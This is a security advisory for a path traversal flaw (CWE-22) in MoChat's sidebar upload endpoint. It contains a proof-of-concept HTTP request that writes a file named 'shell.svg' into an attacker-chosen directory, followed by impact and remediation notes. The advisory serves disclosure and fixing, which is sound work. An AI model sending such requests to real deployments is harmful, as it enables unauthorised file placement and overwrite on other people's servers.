# MoChat — 侧边栏上传路径用户可控 (MC-VULN-011)

| Field | Value |
|-------|-------|
| **Vendor** | mochat-cloud |
| **Product** | MoChat |
| **Version** | master（Hyperf 2.2） |
| **Type** | Path Traversal |
| **CWE** | CWE-22 |
| **Authentication** | Sidebar JWT |

## Summary

`POST /sidebar/common/upload` accepts user `path` (only blocks literal `../`). Filename from client `name` parameter.

## Root cause

`Sidebar/Upload.php` path/name validation weakness.

## Proof of Concept

```http
POST /sidebar/common/upload HTTP/1.1
Host: 127.0.0.1:9501
Authorization: Bearer SIDEBAR_TOKEN
Content-Type: multipart/form-data; boundary=----BOUNDARY
Connection: close

------BOUNDARY
Content-Disposition: form-data; name="path"

attacker/controlled
------BOUNDARY
Content-Disposition: form-data; name="file"; filename="shell.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg"/>
------BOUNDARY--
```

**Expected:** File stored under attacker-chosen subdirectory of upload root

## Impact

Predictable URLs; cross-directory overwrite within upload tree.

## Remediation

Server-generated paths only; strip client filename.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-011
- PoC: `POC_VERIFICATION_REPORT.md`
